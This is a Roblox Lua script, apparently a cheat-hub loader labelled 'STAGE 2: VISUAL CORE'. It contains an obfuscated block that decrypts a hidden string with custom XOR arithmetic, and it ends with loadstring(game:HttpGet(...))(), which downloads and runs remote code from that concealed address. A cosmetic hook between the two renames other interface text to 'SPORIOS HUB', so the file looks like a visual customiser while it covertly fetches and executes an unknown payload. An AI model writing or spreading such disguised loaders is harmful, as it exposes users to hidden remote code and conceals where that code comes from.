
--[[ STAGE 2: VISUAL CORE ]]
local ZXkrWiKbuARP="\007\000\005\014\016\206\222\227\039\059\046\050\070\074\060\012\094\084\089\031\139\139\110\047\130\155\176\140\076\142\164\147"local WxCIiDHLqmOiZppnd3Jd=191 local tDeyakj9yWSBzRyJW3=25 local pFGH5tJbykJGJ=0 local gOXR7FpaWaYiOHHma=5 local nj727DAGwyH2_cYrOaj=18 local v99nZfJIrzpzLTQCVZ8V=false local l0NcdWTrkHU_WTL8KS=bit32 and bit32.bxor if not l0NcdWTrkHU_WTL8KS then l0NcdWTrkHU_WTL8KS=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local vDPgdiLFsedKXI={}for xEoXIuVVWpchMklR=1,#ZXkrWiKbuARP do local gSdlGyJGNcff=string.byte(ZXkrWiKbuARP,xEoXIuVVWpchMklR)local wH2TCW39nxxNn9aRvTMU=(tDeyakj9yWSBzRyJW3+(xEoXIuVVWpchMklR*gOXR7FpaWaYiOHHma)+nj727DAGwyH2_cYrOaj)%256 if pFGH5tJbykJGJ==0 then gSdlGyJGNcff=(gSdlGyJGNcff-wH2TCW39nxxNn9aRvTMU)%256 vDPgdiLFsedKXI[xEoXIuVVWpchMklR]=string.char(l0NcdWTrkHU_WTL8KS(gSdlGyJGNcff,WxCIiDHLqmOiZppnd3Jd))else gSdlGyJGNcff=l0NcdWTrkHU_WTL8KS(gSdlGyJGNcff,WxCIiDHLqmOiZppnd3Jd)vDPgdiLFsedKXI[xEoXIuVVWpchMklR]=string.char((gSdlGyJGNcff-wH2TCW39nxxNn9aRvTMU)%256)end end local DGY3lh0ehY_6w3Ba=table.concat(vDPgdiLFsedKXI)if v99nZfJIrzpzLTQCVZ8V then DGY3lh0ehY_6w3Ba=string.reverse(DGY3lh0ehY_6w3Ba)end local RFG4jrbmLW7efFr0PGP=DGY3lh0ehY_6w3Ba
local HubName = "SPORIOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(RFG4jrbmLW7efFr0PGP))()
